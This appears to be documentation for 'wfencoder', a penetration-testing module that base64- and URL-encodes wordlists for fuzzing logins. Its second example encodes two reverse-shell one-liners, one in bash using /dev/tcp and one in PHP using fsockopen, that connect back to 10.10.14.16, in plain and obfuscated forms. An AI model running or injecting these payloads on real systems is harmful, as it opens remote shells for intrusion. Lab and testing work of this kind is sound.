#### Use case

    More often than not, I am constantly testing URL encoded and base64
    encoded payloads when trying to get a foothold.
    This module is just for speeding up the proccess.

#### Sample module wfencoder - Encode file contents

    If the foothold requires fuzzing a login, this module can help with the payload.
    Sometimes, the login requires a base64 encoded set of credentials.
    Sometimes that base64 encoded data needs to be url encoded after the base64 encoding.
    Below shows both examples.

    Test1:
        Cred.txt
            user:pass
            james:jones
            alex:mercer

        wfencoder -if fuzzFile.txt -be
            dXNlcjpwYXNz
            amFtZXM6am9uZXM=
            YWxleDptZXJjZXI=

    Test2:
        RTCP.txt
            /bin/sh -c '/bin/sh -i >& /dev/tcp/10.10.14.16/4443 0>&1'
            php -r '$sock=fsockopen("10.10.14.16",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

        wfencoder -if fuzzFile.txt -be
            L2Jpbi9zaCAtYyAnL2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNi80NDQzIDA+JjEn
            cGhwIC1yICckc29jaz1mc29ja29wZW4oIjEwLjEwLjE0LjE2Iiw0NDQ0KTtleGVjKCIvYmluL3NoIC1pIDwmMyA+JjMgMj4mMyIpOyc=

        wfencoder -if fuzzFile.txt -ue v3
            %2Fbin%2Fsh%20-c%20%27%2Fbin%2Fsh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.16%2F4443%200%3E%261%27
            php%20-r%20%27%24sock%3Dfsockopen%28%2210.10.14.16%22%2C4444%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27

        wfencoder -if fuzzFile.txt -be -ue v3
            L2Jpbi9zaCAtYyAnL2Jpbi9zaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4xNi80NDQzIDA%2BJjEn
            cGhwIC1yICckc29jaz1mc29ja29wZW4oIjEwLjEwLjE0LjE2Iiw0NDQ0KTtleGVjKCIvYmluL3NoIC1pIDwmMyA%2BJjMgMj4mMyIpOyc%3D

##### _All modules have helper flags -h and --help for more assistance._
